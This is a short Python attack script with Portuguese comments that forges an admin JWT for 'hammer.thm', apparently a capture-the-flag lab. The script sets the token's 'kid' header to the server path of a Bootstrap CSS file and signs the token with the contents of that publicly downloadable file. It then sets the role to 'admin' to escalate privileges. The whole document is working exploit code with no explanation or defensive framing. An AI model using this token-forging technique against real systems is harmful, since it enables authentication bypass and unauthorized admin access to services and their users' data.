import hmac
import hashlib
import base64
import json
import time
import os

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    encoded = base64.urlsafe_b64encode(data).decode('utf-8')
    return encoded.replace('=', '')

# Carrega o arquivo CSS baixado para usar como chave
# Certifique-se de ter rodado o wget antes!
try:
    with open("my_secret_key.css", "rb") as f:
        secret = f.read()
    print(f"[*] CSS carregado como chave. Tamanho: {len(secret)} bytes")
except FileNotFoundError:
    print("[!] Erro: Arquivo 'my_secret_key.css' não encontrado. Faça o wget primeiro!")
    exit()

# 1. HEADER MODIFICADO
# Apontamos para o caminho absoluto do CSS no servidor
header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/hmr_css/bootstrap.min.css"
}

# 2. PAYLOAD MODIFICADO
current_time = int(time.time())
payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": current_time,
    "exp": current_time + 3600,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"  # <--- Role Admin
    }
}

# 3. CONSTRUÇÃO DO TOKEN
encoded_header = base64url_encode(json.dumps(header, separators=(',', ':')))
encoded_payload = base64url_encode(json.dumps(payload, separators=(',', ':')))
token_data = f"{encoded_header}.{encoded_payload}"

# 4. ASSINATURA (Usando o conteúdo do CSS como senha)
signature = hmac.new(secret, token_data.encode('utf-8'), hashlib.sha256).digest()
encoded_signature = base64url_encode(signature)

jwt_forged = f"{token_data}.{encoded_signature}"

print("-" * 50)
print("NOVO TOKEN (Role: admin | Key: bootstrap.min.css):")
print("-" * 50)
print(jwt_forged)
print("-" * 50)
